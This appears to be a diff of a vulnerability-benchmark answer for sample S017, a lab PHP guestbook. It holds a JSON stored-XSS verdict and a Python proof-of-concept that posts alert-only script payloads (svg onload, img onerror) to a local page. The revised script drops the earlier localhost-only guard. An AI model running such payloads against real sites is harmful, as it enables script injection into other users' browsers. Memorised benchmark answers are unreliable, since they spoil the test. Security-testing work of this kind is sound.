@@ -1,88 +1,62 @@
 ```json
-{
-  "sample_id": "S017",
-  "prediction": "vulnerable",
-  "vulnerability_type": "XSS",
-  "locations": ["F01:0008", "F01:0015", "F01:0016", "F01:0017", "F01:0030", "F01:0033", "F01:0053"],
-  "evidence": {
-    "source": "F01:0008 从 $_POST['body'] 读取可控字符串；F01:0009 仅检查非空和长度。",
-    "flow": "写入请求：F01:0008 取得 body，F01:0015-F01:0017 通过参数绑定 INSERT 到 lab_guestbook 持久化。随后独立 GET 请求：F01:0030-F01:0033 按 sample_id 查询 body。渲染：F01:0053 在 HTML 正文的 div 内直接 echo。",
-    "guard": "无效；F01:0009 只做非空和长度限制，F01:0015-F01:0016 的 SQL 参数绑定只防 SQL 注入，F01:0038 的 charset 声明不防 XSS，F01:0053 未使用 htmlspecialchars 等 HTML 上下文编码。",
-    "sink": "F01:0053 直接输出 $message['body'] 到 HTML 正文，未编码，可注入 HTML 事件处理器并触发 JavaScript。"
-  },
-  "prerequisites": [
-    "可通过 HTTP 访问 127.0.0.1:4280 下实际的 S017 留言板页面；无需登录。",
-    "PHP 与 MariaDB 教学留言板正常运行，POST 写入和 GET 读取均成功。",
-    "浏览器需实际加载读取后的页面以确认 JavaScript 执行；仅 HTTP 响应体包含字符串不等同于执行。"
-  ],
-  "missing_context": [
-    "输入包未给出 127.0.0.1:4280 上 S017 页面的具体 URL 路径；POC 通过 TARGET_URL 指定实际页面 URL。"
-  ],
-  "poc_generated": true,
-  "poc_language": "python3",
-  "poc_instructions": "仅对 http://127.0.0.1:4280 下实际 S017 页面运行。设置 TARGET_URL 为浏览器访问该留言板页面的 URL，路径以本地环境为准，脚本会校验 host 和 port。先运行 python3 poc_s017.py normal，发布普通留言，然后在浏览器打开 TARGET_URL，确认不出现 S017-XSS 提示框。再运行 python3 poc_s017.py test，发布测试载荷，重新在浏览器打开 TARGET_URL，人工确认出现 alert('S017-XSS')。脚本只做本地 POST 和 GET，不执行 JavaScript、不外发数据；HTTP 响应体包含载荷字符串不等同于浏览器执行。防护建议：在 F01:0053 输出到 HTML 正文前使用 htmlspecialchars($message['body'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')，该建议未经本地验证。"
-}
+{"sample_id":"S017","prediction":"vulnerable","vulnerability_type":"XSS","locations":["F01:0008","F01:0015","F01:0016","F01:0030","F01:0033","F01:0053"],"evidence":{"source":"F01:0008 从 $_POST['body'] 原样取得留言，仅做空值和长度检查","flow":"F01:0015-F01:0016 参数化写入 lab_guestbook.body；F01:0030-F01:0033 读取 body；F01:0053 将 body 输出到 HTML 正文","guard":"无效：F01:0053 直接 echo，无 HTML 实体编码或净化；参数化仅防 SQL 注入，不防 XSS","sink":"F01:0053 在 div 正文内直接 echo $message['body']，未转义"},"prerequisites":["S017 页面可通过 http://127.0.0.1:4280/ 对应路径访问","数据库表 lab_guestbook 可用且 POST 保存成功","使用支持 JavaScript 的浏览器打开页面观察"],"missing_context":["未提供 S017 页面具体 URL 路径；脚本默认使用 127.0.0.1:4280 根路径，需按实际 index.php 地址配置","未提供浏览器 CSP 等客户端上下文；脚本执行需人工在浏览器确认"],"poc_generated":true,"poc_language":"python3","poc_instructions":"将环境变量 S017_URL 设置为 S017 的实际 index.php 地址，默认 http://127.0.0.1:4280/。运行脚本会先 POST 普通标记 S017_NORMAL_MARKER，再 GET 页面；随后 POST 测试输入 <svg onload=alert('S017_XSS')></svg> 并 GET 页面。最后人工在浏览器打开同一 URL：普通输入应仅作为文本显示；测试输入若被执行会弹出 S017_XSS。HTTP 响应体包含 payload 字符串不等同于 JavaScript 执行。"}
 ```
 
 ```python
 import os
-import sys
 import urllib.parse
 import urllib.request
-import urllib.error
 
-TARGET_URL = os.environ.get("TARGET_URL", "").strip()
-if not TARGET_URL:
-    sys.exit("请设置 TARGET_URL，例如：TARGET_URL='http://127.0.0.1:4280/<S017页面实际路径>' python3 poc_s017.py normal")
+TARGET_URL = os.environ.get("S017_URL", "http://127.0.0.1:4280/")
+NORMAL_INPUT = "S017_NORMAL_MARKER"
+TEST_INPUT = "<svg onload=alert('S017_XSS')></svg>"
 
-parsed = urllib.parse.urlparse(TARGET_URL)
-if parsed.scheme != "http" or parsed.hostname != "127.0.0.1" or parsed.port != 4280:
-    sys.exit("只允许访问 http://127.0.0.1:4280/ 下的目标页面，拒绝其他主机或端口。")
 
-mode = sys.argv[1] if len(sys.argv) > 1 else ""
-if mode == "normal":
-    body = "S017 普通留言：无脚本标记"
-elif mode == "test":
-    body = "<img src=x onerror=\"alert('S017-XSS')\">"
-else:
-    sys.exit("用法：python3 poc_s017.py normal|test；并设置 TARGET_URL")
+def post_body(url: str, body: str):
+    data = urllib.parse.urlencode({"body": body}).encode("utf-8")
+    req = urllib.request.Request(
+        url,
+        data=data,
+        method="POST",
+        headers={"Content-Type": "application/x-www-form-urlencoded"},
+    )
+    with urllib.request.urlopen(req, timeout=10) as resp:
+        return resp.status, resp.read().decode("utf-8", "replace")
 
-data = urllib.parse.urlencode({"body": body}).encode("utf-8")
-post_req = urllib.request.Request(
-    TARGET_URL,
-    data=data,
-    method="POST",
-    headers={"Content-Type": "application/x-www-form-urlencoded"},
-)
 
-try:
-    with urllib.request.urlopen(post_req, timeout=10) as resp:
-        post_status = resp.status
-        post_final_url = resp.geturl()
-        resp.read()
-except urllib.error.HTTPError as exc:
-    print(f"POST 返回 HTTP {exc.code}，未继续。")
-    sys.exit(1)
-except Exception as exc:
-    print(f"POST 失败：{exc}")
-    sys.exit(1)
+def get_page(url: str):
+    with urllib.request.urlopen(url, timeout=10) as resp:
+        return resp.status, resp.read().decode("utf-8", "replace")
 
-get_req = urllib.request.Request(TARGET_URL, method="GET")
-try:
-    with urllib.request.urlopen(get_req, timeout=10) as resp:
-        get_status = resp.status
-        html = resp.read().decode("utf-8", "replace")
-except Exception as exc:
-    print(f"GET 失败：{exc}")
-    sys.exit(1)
 
-print(f"POST 最终状态：{post_status}，最终 URL：{post_final_url}")
-print(f"GET 状态：{get_status}")
-print(f"响应体是否包含本次提交字符串（仅表示回显，不证明脚本执行）：{body in html}")
+def main():
+    print("目标 URL:", TARGET_URL)
 
-if mode == "normal":
-    print("普通对照：请在浏览器打开 TARGET_URL，确认页面不应出现 S017-XSS 提示框。")
-else:
-    print("测试输入：请在浏览器打开 TARGET_URL，人工确认应出现 alert('S017-XSS')。")
-    print("注意：HTTP 响应体出现字符串不等同于 JavaScript 执行。")
+    print("\n[1] 写入普通输入:", NORMAL_INPUT)
+    status, _ = post_body(TARGET_URL, NORMAL_INPUT)
+    print("POST 普通输入状态:", status)
+
+    status, html = get_page(TARGET_URL)
+    print("GET 页面状态:", status)
+    print("响应含普通标记:", NORMAL_INPUT in html)
+    print("响应含测试 payload 字符串:", TEST_INPUT in html)
+
+    print("\n[2] 写入测试输入:", TEST_INPUT)
+    status, _ = post_body(TARGET_URL, TEST_INPUT)
+    print("POST 测试输入状态:", status)
+
+    status, html = get_page(TARGET_URL)
+    print("GET 页面状态:", status)
+    print("响应含测试 payload 字符串:", TEST_INPUT in html)
+
+    print("\n[3] 需要人工在浏览器确认：")
+    print("请打开:", TARGET_URL)
+    print("普通标记应只作为文本显示；测试输入若被浏览器执行，应弹出提示框 S017_XSS。")
+    print("注意：HTTP 响应中出现 payload 字符串不等同于 JavaScript 已执行。")
+
+
+if __name__ == "__main__":
+    main()
 ```
+
+防护建议（非已验证事实）：输出留言时使用 `htmlspecialchars($message['body'], ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')`，或使用默认自动转义的模板；继续保留参数化 SQL；可结合 CSP 降低 XSS 影响。
